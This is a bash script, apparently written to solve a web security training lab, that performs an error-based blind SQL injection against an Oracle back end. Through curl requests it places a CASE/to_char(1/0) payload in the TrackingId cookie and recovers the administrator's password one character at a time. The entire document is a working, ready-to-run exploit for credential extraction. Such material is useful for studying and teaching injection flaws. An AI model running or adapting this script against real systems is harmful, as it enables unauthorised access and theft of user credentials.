#!/bin/bash

# --- Configuration ---
URL="LAB_URL"
SESSION_COOKIE="SESSION_COOKIE" # IMPORTANT: Replace with your actual session cookie value
# Characters to try for the password. I have assumed it uses only lowercase chars and numbers.
CHARSET="abcdefghijklmnopqrstuvwxyz0123456789"
MAX_PASSWORD_LENGTH=20 # I have assumed 20 is the length because of the previous lab.

# --- Script Logic ---
echo "Starting blind SQL injection attack..."

DISCOVERED_PASSWORD=""
POSITION=1

while [ ${POSITION} -le ${MAX_PASSWORD_LENGTH} ]; do
    FOUND_CHAR=""
    echo -n "Trying character for position ${POSITION}: "

    for GUESS_CHAR in $(echo "${CHARSET}" | grep -o .); do
        # Construct the TrackingId payload
        # The ' -- -' at the end comments out the rest of the SQL query
        # it is an oracle database. ThatÂ´s why I use ||
        # if the query is correct it will enter in the case and then if the character matches, it will do to_char(1/0) which will return an error
        TRACKING_ID_PAYLOAD="YOUR_TRACKING_ID'||(select case when substr(password,${POSITION},1)='${GUESS_CHAR}' then to_char(1/0) else '' end from users where username='administrator')||'"

        # Perform the curl request silently (-s)
        # -b sends the cookies
        RESPONSE=$(curl -s -b "session=${SESSION_COOKIE}; TrackingId=${TRACKING_ID_PAYLOAD}" "${URL}")

        # Check if the success message is in the response
        # The response status would be 500 if it is successful and 200 if unsucessful. But I have opted to use "Internal Server Error".
        if echo "${RESPONSE}" | grep -q "Internal Server Error"; then
            FOUND_CHAR="${GUESS_CHAR}"
            DISCOVERED_PASSWORD="${DISCOVERED_PASSWORD}${FOUND_CHAR}"
            echo "${FOUND_CHAR} (Found!)"
            break # Move to the next position
        fi
        echo -n "${GUESS_CHAR}" # Show progress
    done

    if [ -z "${FOUND_CHAR}" ]; then
        echo -e "\nNo character found for position ${POSITION}. Assuming end of password or character not in CHARSET."
        break # No character found for this position, likely end of password
    fi

    POSITION=$((POSITION + 1))
done

echo -e "\n--- Attack Complete ---"
if [ -n "${DISCOVERED_PASSWORD}" ]; then
    echo "Discovered password: ${DISCOVERED_PASSWORD}"
else
    echo "Could not discover the password."
fi

